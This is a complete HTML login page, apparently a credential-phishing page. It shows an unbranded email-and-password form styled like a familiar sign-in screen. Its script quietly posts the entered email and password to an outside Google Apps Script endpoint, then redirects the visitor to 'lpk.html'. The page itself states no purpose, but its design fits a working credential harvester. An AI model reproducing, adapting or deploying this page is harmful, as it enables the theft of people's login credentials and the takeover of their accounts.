<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Login</title>

<style>
body{
  font-family: Arial, sans-serif;
  background:#f1f3f4;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
  margin:0;
}

.card{
  background:white;
  width:350px;
  padding:30px;
  border-radius:12px;
  box-shadow:0 4px 20px rgba(0,0,0,0.1);
}

input{
  width:100%;
  padding:12px;
  margin:10px 0;
  border:1px solid #dadce0;
  border-radius:6px;
}

button{
  width:100%;
  padding:12px;
  background:#1a73e8;
  color:white;
  border:none;
  border-radius:6px;
  cursor:pointer;
}
</style>
</head>

<body>

<div class="card">
  <h2>Login</h2>

  <form id="loginForm">
    <input type="email" name="email" placeholder="Email" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Login</button>
  </form>
</div>

<script>
document.getElementById("loginForm").addEventListener("submit", function(e){
  e.preventDefault();

  fetch("https://script.google.com/macros/s/AKfycbxTtoVDUB96jtAofsc1nlmBgJPkaJKMKtxPfHAaueX9l3djxQaCWpi3TLWjbzWKd1qt/exec", {
    method: "POST",
    body: new FormData(this)
  })
  .then(response => response.text())
  .then(data => {
    window.location.href = "lpk.html";
  });
});
</script>

</body>
</html>
